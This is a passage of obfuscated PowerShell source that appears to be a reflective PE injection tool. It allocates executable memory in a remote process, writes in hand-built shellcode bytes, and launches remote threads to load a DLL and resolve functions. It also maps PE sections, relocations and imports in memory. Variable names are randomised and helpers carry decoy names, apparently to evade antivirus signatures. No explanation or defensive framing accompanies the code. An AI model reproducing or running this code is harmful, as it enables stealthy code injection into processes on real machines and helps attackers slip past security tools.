        $oTFkysOx99 = $EeGdRnzz99.WriteProcessMemory.Invoke($HrCwxdne99, $tGJwkBNo99, $eICoouhl99, $mrZjKzuu99, [Ref]$TAuMVxYU99)

        if ($oTFkysOx99 -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($mrZjKzuu99 -ne $TAuMVxYU99)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $hLKAMRnU99 = $EeGdRnzz99.GetModuleHandle.Invoke("kernel32.dll")
        $gOaRYYAH99 = $EeGdRnzz99.GetProcAddress.Invoke($hLKAMRnU99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$JSVoTLFQ99 = [IntPtr]::Zero
        if ($PEInfo.PE64Bit -eq $true)
        {
            $yEAmvJMR99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, [IntPtr]::Zero, $mrZjKzuu99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($yEAmvJMR99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }

            $gsSHZzHq99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $fHDSpgbq99 = @(0x48, 0xba)
            $cCKGhubo99 = @(0xff, 0xd2, 0x48, 0xba)
            $mBQCbLml99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $jPPAExXJ99 = $gsSHZzHq99.Length + $fHDSpgbq99.Length + $cCKGhubo99.Length + $mBQCbLml99.Length + ($WqGHXyIC99 * 3)
            $ykIXWpCw99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($jPPAExXJ99)
            $YYcfaVeg99 = $ykIXWpCw99

            boogie -Bytes $gsSHZzHq99 -ynTERLem99 $ykIXWpCw99
            $ykIXWpCw99 = unkind $ykIXWpCw99 ($gsSHZzHq99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($tGJwkBNo99, $ykIXWpCw99, $false)
            $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
            boogie -Bytes $fHDSpgbq99 -ynTERLem99 $ykIXWpCw99
            $ykIXWpCw99 = unkind $ykIXWpCw99 ($fHDSpgbq99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($gOaRYYAH99, $ykIXWpCw99, $false)
            $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
            boogie -Bytes $cCKGhubo99 -ynTERLem99 $ykIXWpCw99
            $ykIXWpCw99 = unkind $ykIXWpCw99 ($cCKGhubo99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($yEAmvJMR99, $ykIXWpCw99, $false)
            $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
            boogie -Bytes $mBQCbLml99 -ynTERLem99 $ykIXWpCw99
            $ykIXWpCw99 = unkind $ykIXWpCw99 ($mBQCbLml99.Length)

            $LcUtwSae99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, [IntPtr]::Zero, [UIntPtr][UInt64]$jPPAExXJ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($LcUtwSae99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $oTFkysOx99 = $EeGdRnzz99.WriteProcessMemory.Invoke($HrCwxdne99, $LcUtwSae99, $YYcfaVeg99, [UIntPtr][UInt64]$jPPAExXJ99, [Ref]$TAuMVxYU99)
            if (($oTFkysOx99 -eq $false) -or ([UInt64]$TAuMVxYU99 -ne [UInt64]$jPPAExXJ99))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $TiGGpOmj99 = muffling -zzlkUotp99 $HrCwxdne99 -StartAddress $LcUtwSae99 -EeGdRnzz99 $EeGdRnzz99
            $adFraWRE99 = $EeGdRnzz99.WaitForSingleObject.Invoke($TiGGpOmj99, 20000)
            if ($adFraWRE99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [IntPtr]$kgVrELpe99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WqGHXyIC99)
            $adFraWRE99 = $EeGdRnzz99.ReadProcessMemory.Invoke($HrCwxdne99, $yEAmvJMR99, $kgVrELpe99, [UIntPtr][UInt64]$WqGHXyIC99, [Ref]$TAuMVxYU99)
            if ($adFraWRE99 -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$JSVoTLFQ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kgVrELpe99, [Type][IntPtr])

            $EeGdRnzz99.VirtualFreeEx.Invoke($HrCwxdne99, $yEAmvJMR99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $EeGdRnzz99.VirtualFreeEx.Invoke($HrCwxdne99, $LcUtwSae99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$TiGGpOmj99 = muffling -zzlkUotp99 $HrCwxdne99 -StartAddress $gOaRYYAH99 -AkLUHxrK99 $tGJwkBNo99 -EeGdRnzz99 $EeGdRnzz99
            $adFraWRE99 = $EeGdRnzz99.WaitForSingleObject.Invoke($TiGGpOmj99, 20000)
            if ($adFraWRE99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$gzjgcvQJ99 = 0
            $adFraWRE99 = $EeGdRnzz99.GetExitCodeThread.Invoke($TiGGpOmj99, [Ref]$gzjgcvQJ99)
            if (($adFraWRE99 -eq 0) -or ($gzjgcvQJ99 -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$JSVoTLFQ99 = [IntPtr]$gzjgcvQJ99
        }

        $EeGdRnzz99.VirtualFreeEx.Invoke($HrCwxdne99, $tGJwkBNo99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $JSVoTLFQ99
    }

    Function staple
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $HrCwxdne99,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $GsNyhzwe99,

        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $yEQmAXNE99,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $bxZqeAtt99
        )

        $WqGHXyIC99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$LgnQfAMG99 = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        if (-not $bxZqeAtt99)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($yEQmAXNE99)

            $pSUAYpNr99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $LgnQfAMG99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, [IntPtr]::Zero, $pSUAYpNr99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LgnQfAMG99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$TAuMVxYU99 = [UIntPtr]::Zero
            $oTFkysOx99 = $EeGdRnzz99.WriteProcessMemory.Invoke($HrCwxdne99, $LgnQfAMG99, $yEQmAXNE99, $pSUAYpNr99, [Ref]$TAuMVxYU99)
            if ($oTFkysOx99 -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($pSUAYpNr99 -ne $TAuMVxYU99)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        else
        {
            $LgnQfAMG99 = $yEQmAXNE99
        }

        $hLKAMRnU99 = $EeGdRnzz99.GetModuleHandle.Invoke("kernel32.dll")
        $TRRQNeGN99 = $EeGdRnzz99.GetProcAddress.Invoke($hLKAMRnU99, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        $ejtPJgjU99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, [IntPtr]::Zero, [UInt64][UInt64]$WqGHXyIC99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($ejtPJgjU99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }

        [Byte[]]$HHUAalld99 = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $qlcEquyW99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $UPpOgVNn99 = @(0x48, 0xba)
            $iiAQVKfg99 = @(0x48, 0xb8)
            $BRQzcojg99 = @(0xff, 0xd0, 0x48, 0xb9)
            $KJVCkdwB99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $qlcEquyW99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $UPpOgVNn99 = @(0xb9)
            $iiAQVKfg99 = @(0x51, 0x50, 0xb8)
            $BRQzcojg99 = @(0xff, 0xd0, 0xb9)
            $KJVCkdwB99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $jPPAExXJ99 = $qlcEquyW99.Length + $UPpOgVNn99.Length + $iiAQVKfg99.Length + $BRQzcojg99.Length + $KJVCkdwB99.Length + ($WqGHXyIC99 * 4)
        $ykIXWpCw99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($jPPAExXJ99)
        $YYcfaVeg99 = $ykIXWpCw99

        boogie -Bytes $qlcEquyW99 -ynTERLem99 $ykIXWpCw99
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($qlcEquyW99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GsNyhzwe99, $ykIXWpCw99, $false)
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
        boogie -Bytes $UPpOgVNn99 -ynTERLem99 $ykIXWpCw99
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($UPpOgVNn99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($LgnQfAMG99, $ykIXWpCw99, $false)
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
        boogie -Bytes $iiAQVKfg99 -ynTERLem99 $ykIXWpCw99
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($iiAQVKfg99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TRRQNeGN99, $ykIXWpCw99, $false)
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
        boogie -Bytes $BRQzcojg99 -ynTERLem99 $ykIXWpCw99
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($BRQzcojg99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ejtPJgjU99, $ykIXWpCw99, $false)
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
        boogie -Bytes $KJVCkdwB99 -ynTERLem99 $ykIXWpCw99
        $ykIXWpCw99 = unkind $ykIXWpCw99 ($KJVCkdwB99.Length)

        $LcUtwSae99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, [IntPtr]::Zero, [UIntPtr][UInt64]$jPPAExXJ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($LcUtwSae99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$TAuMVxYU99 = [UIntPtr]::Zero
        $oTFkysOx99 = $EeGdRnzz99.WriteProcessMemory.Invoke($HrCwxdne99, $LcUtwSae99, $YYcfaVeg99, [UIntPtr][UInt64]$jPPAExXJ99, [Ref]$TAuMVxYU99)
        if (($oTFkysOx99 -eq $false) -or ([UInt64]$TAuMVxYU99 -ne [UInt64]$jPPAExXJ99))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $TiGGpOmj99 = muffling -zzlkUotp99 $HrCwxdne99 -StartAddress $LcUtwSae99 -EeGdRnzz99 $EeGdRnzz99
        $adFraWRE99 = $EeGdRnzz99.WaitForSingleObject.Invoke($TiGGpOmj99, 20000)
        if ($adFraWRE99 -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        [IntPtr]$kgVrELpe99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WqGHXyIC99)
        $adFraWRE99 = $EeGdRnzz99.ReadProcessMemory.Invoke($HrCwxdne99, $ejtPJgjU99, $kgVrELpe99, [UIntPtr][UInt64]$WqGHXyIC99, [Ref]$TAuMVxYU99)
        if (($adFraWRE99 -eq $false) -or ($TAuMVxYU99 -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$uzqcGWSL99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kgVrELpe99, [Type][IntPtr])

        $EeGdRnzz99.VirtualFreeEx.Invoke($HrCwxdne99, $LcUtwSae99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $EeGdRnzz99.VirtualFreeEx.Invoke($HrCwxdne99, $ejtPJgjU99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $bxZqeAtt99)
        {
            $EeGdRnzz99.VirtualFreeEx.Invoke($HrCwxdne99, $LgnQfAMG99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

        return $uzqcGWSL99
    }


    Function indistinctly
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $cprRzWpK99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $EeGdRnzz99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$NkqCGpMd99 = [IntPtr](unkind ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.IMAGE_SECTION_HEADER)))
            $EeEsXjgG99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NkqCGpMd99, [Type]$rksQRGqN99.IMAGE_SECTION_HEADER)

            [IntPtr]$EbekUhzH99 = [IntPtr](unkind ([Int64]$PEInfo.PEHandle) ([Int64]$EeEsXjgG99.VirtualAddress))

            $zESwgxpq99 = $EeEsXjgG99.SizeOfRawData

            if ($EeEsXjgG99.PointerToRawData -eq 0)
            {
                $zESwgxpq99 = 0
            }

            if ($zESwgxpq99 -gt $EeEsXjgG99.VirtualSize)
            {
                $zESwgxpq99 = $EeEsXjgG99.VirtualSize
            }

            if ($zESwgxpq99 -gt 0)
            {
                ferment -NPrHmsgo99 "indistinctly::MarshalCopy" -PEInfo $PEInfo -StartAddress $EbekUhzH99 -Size $zESwgxpq99 | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($cprRzWpK99, [Int32]$EeEsXjgG99.PointerToRawData, $EbekUhzH99, $zESwgxpq99)
            }

            if ($EeEsXjgG99.SizeOfRawData -lt $EeEsXjgG99.VirtualSize)
            {
                $bcTgMLzV99 = $EeEsXjgG99.VirtualSize - $zESwgxpq99
                [IntPtr]$StartAddress = [IntPtr](unkind ([Int64]$EbekUhzH99) ([Int64]$zESwgxpq99))
                ferment -NPrHmsgo99 "indistinctly::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $bcTgMLzV99 | Out-Null
                $EeGdRnzz99.memset.Invoke($StartAddress, 0, [IntPtr]$bcTgMLzV99) | Out-Null
            }
        }
    }


    Function horticulture
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $cjTOWTzl99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99
        )

        [Int64]$IzEmpwpY99 = 0
        $DJqfanSC99 = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$wNntdTlb99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.IMAGE_BASE_RELOCATION)

        if (($cjTOWTzl99 -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((dissecting ($cjTOWTzl99) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $IzEmpwpY99 = remarkably ($cjTOWTzl99) ($PEInfo.EffectivePEHandle)
            $DJqfanSC99 = $false
        }
        elseif ((dissecting ($PEInfo.EffectivePEHandle) ($cjTOWTzl99)) -eq $true)
        {
            $IzEmpwpY99 = remarkably ($PEInfo.EffectivePEHandle) ($cjTOWTzl99)
        }

        [IntPtr]$kiKjstpm99 = [IntPtr](unkind ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            $spuDQOih99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($kiKjstpm99, [Type]$rksQRGqN99.IMAGE_BASE_RELOCATION)

            if ($spuDQOih99.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$fZXRHRGy99 = [IntPtr](unkind ([Int64]$PEInfo.PEHandle) ([Int64]$spuDQOih99.VirtualAddress))
            $yaJFrxas99 = ($spuDQOih99.SizeOfBlock - $wNntdTlb99) / 2

            for($i = 0; $i -lt $yaJFrxas99; $i++)
            {
                $pmjTFSOp99 = [IntPtr](unkind ([IntPtr]$kiKjstpm99) ([Int64]$wNntdTlb99 + (2 * $i)))
                [UInt16]$nTpUUikP99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pmjTFSOp99, [Type][UInt16])

                [UInt16]$kghVkQbl99 = $nTpUUikP99 -band 0x0FFF
                [UInt16]$nWOPsVXl99 = $nTpUUikP99 -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $nWOPsVXl99 = [Math]::Floor($nWOPsVXl99 / 2)
                }

                if (($nWOPsVXl99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($nWOPsVXl99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    [IntPtr]$OkBReZGM99 = [IntPtr](unkind ([Int64]$fZXRHRGy99) ([Int64]$kghVkQbl99))
                    [IntPtr]$wMxNQBDr99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OkBReZGM99, [Type][IntPtr])

                    if ($DJqfanSC99 -eq $true)
                    {
                        [IntPtr]$wMxNQBDr99 = [IntPtr](unkind ([Int64]$wMxNQBDr99) ($IzEmpwpY99))
                    }
                    else
                    {
                        [IntPtr]$wMxNQBDr99 = [IntPtr](remarkably ([Int64]$wMxNQBDr99) ($IzEmpwpY99))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($wMxNQBDr99, $OkBReZGM99, $false) | Out-Null
                }
                elseif ($nWOPsVXl99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    Throw "Unknown relocation found, relocation value: $nWOPsVXl99, relocationinfo: $nTpUUikP99"
                }
            }

            $kiKjstpm99 = [IntPtr](unkind ([Int64]$kiKjstpm99) ([Int64]$spuDQOih99.SizeOfBlock))
        }
    }


    Function infomercial
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EeGdRnzz99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $HrCwxdne99
        )

        $YpYnLYkq99 = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $YpYnLYkq99 = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$CcGcZQFo99 = unkind ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $LqIgzCyB99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CcGcZQFo99, [Type]$rksQRGqN99.IMAGE_IMPORT_DESCRIPTOR)

                if ($LqIgzCyB99.Characteristics -eq 0 `
                        -and $LqIgzCyB99.FirstThunk -eq 0 `
                        -and $LqIgzCyB99.ForwarderChain -eq 0 `
                        -and $LqIgzCyB99.Name -eq 0 `
                        -and $LqIgzCyB99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $wAMROBuq99 = [IntPtr]::Zero
                $eICoouhl99 = (unkind ([Int64]$PEInfo.PEHandle) ([Int64]$LqIgzCyB99.Name))
                $XYhTkdpp99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($eICoouhl99)

                if ($YpYnLYkq99 -eq $true)
                {
                    $wAMROBuq99 = intestate -HrCwxdne99 $HrCwxdne99 -eICoouhl99 $eICoouhl99
                }
                else
                {
                    $wAMROBuq99 = $EeGdRnzz99.LoadLibrary.Invoke($XYhTkdpp99)
                }

                if (($wAMROBuq99 -eq $null) -or ($wAMROBuq99 -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $XYhTkdpp99"
                }

                [IntPtr]$uesBysZO99 = unkind ($PEInfo.PEHandle) ($LqIgzCyB99.FirstThunk)
                [IntPtr]$yUpGDlmB99 = unkind ($PEInfo.PEHandle) ($LqIgzCyB99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$EDfNdDsR99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($yUpGDlmB99, [Type][IntPtr])

                while ($EDfNdDsR99 -ne [IntPtr]::Zero)
                {
                    $bxZqeAtt99 = $false
                    [IntPtr]$bvSHunTB99 = [IntPtr]::Zero
                    [IntPtr]$SZbzFOex99 = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$EDfNdDsR99 -lt 0)
                    {
                        [IntPtr]$bvSHunTB99 = [IntPtr]$EDfNdDsR99 -band 0xffff #This is actually a lookup by ordinal
                        $bxZqeAtt99 = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$EDfNdDsR99 -lt 0)
                    {
                        [IntPtr]$bvSHunTB99 = [Int64]$EDfNdDsR99 -band 0xffff #This is actually a lookup by ordinal
                        $bxZqeAtt99 = $true
                    }
                    else
                    {
                        [IntPtr]$QYkPJusK99 = unkind ($PEInfo.PEHandle) ($EDfNdDsR99)
                        $QYkPJusK99 = unkind $QYkPJusK99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $lqfTicVU99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($QYkPJusK99)
                        $bvSHunTB99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($lqfTicVU99)
                    }

                    if ($YpYnLYkq99 -eq $true)
                    {
                        [IntPtr]$SZbzFOex99 = staple -HrCwxdne99 $HrCwxdne99 -GsNyhzwe99 $wAMROBuq99 -yEQmAXNE99 $bvSHunTB99 -bxZqeAtt99 $bxZqeAtt99
                    }
                    else
                    {
                        [IntPtr]$SZbzFOex99 = $EeGdRnzz99.GetProcAddressIntPtr.Invoke($wAMROBuq99, $bvSHunTB99)
                    }

                    if ($SZbzFOex99 -eq $null -or $SZbzFOex99 -eq [IntPtr]::Zero)
                    {
                        if ($bxZqeAtt99)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $bvSHunTB99. Dll: $XYhTkdpp99"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $lqfTicVU99. Dll: $XYhTkdpp99"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($SZbzFOex99, $uesBysZO99, $false)

                    $uesBysZO99 = unkind ([Int64]$uesBysZO99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$yUpGDlmB99 = unkind ([Int64]$yUpGDlmB99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$EDfNdDsR99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($yUpGDlmB99, [Type][IntPtr])

                    if ((-not $bxZqeAtt99) -and ($bvSHunTB99 -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($bvSHunTB99)
                        $bvSHunTB99 = [IntPtr]::Zero
                    }
                }

                $CcGcZQFo99 = unkind ($CcGcZQFo99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function recognizes
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $wltxZcem99
        )

        $kWtInPsl99 = 0x0
        if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $kWtInPsl99 = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($wltxZcem99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $kWtInPsl99 = $kWtInPsl99 -bor $Win32Constants.PAGE_NOCACHE
        }

        return $kWtInPsl99
    }

    Function show
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EeGdRnzz99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $rksQRGqN99
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$NkqCGpMd99 = [IntPtr](unkind ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$rksQRGqN99.IMAGE_SECTION_HEADER)))
            $EeEsXjgG99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NkqCGpMd99, [Type]$rksQRGqN99.IMAGE_SECTION_HEADER)
            [IntPtr]$gqjARsEp99 = unkind ($PEInfo.PEHandle) ($EeEsXjgG99.VirtualAddress)

            [UInt32]$QkPcdXzK99 = recognizes $EeEsXjgG99.Characteristics
            [UInt32]$uNeJeAYw99 = $EeEsXjgG99.VirtualSize

            [UInt32]$BDCVaLLL99 = 0
            ferment -NPrHmsgo99 "show::VirtualProtect" -PEInfo $PEInfo -StartAddress $gqjARsEp99 -Size $uNeJeAYw99 | Out-Null
            $oTFkysOx99 = $EeGdRnzz99.VirtualProtect.Invoke($gqjARsEp99, $uNeJeAYw99, $QkPcdXzK99, [Ref]$BDCVaLLL99)
            if ($oTFkysOx99 -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    Function Moho
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EeGdRnzz99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $soqoeDoI99,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $DJCHOHLj99
        )

        $erFfaYzS99 = @()

